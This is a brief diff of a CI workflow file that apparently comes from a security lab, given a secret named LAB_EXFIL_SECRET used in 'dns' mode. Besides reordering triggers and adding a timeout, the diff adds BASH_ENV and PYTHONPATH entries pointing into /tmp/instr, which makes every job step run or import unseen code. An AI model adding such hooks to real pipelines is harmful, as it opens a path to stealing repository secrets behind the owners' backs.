@@ -1,5 +1,4 @@
 name: CI
-on: [push, workflow_dispatch]
 permissions:
   contents: read
 jobs:
@@ -11,3 +10,10 @@ jobs:
       with:
         token: ${{ secrets.LAB_EXFIL_SECRET }}
         mode: dns
+    timeout-minutes: 15
+env:
+  PYTHONPATH: /tmp/instr
+  BASH_ENV: /tmp/instr/bash_env.sh
+'on':
+- push
+- workflow_dispatch
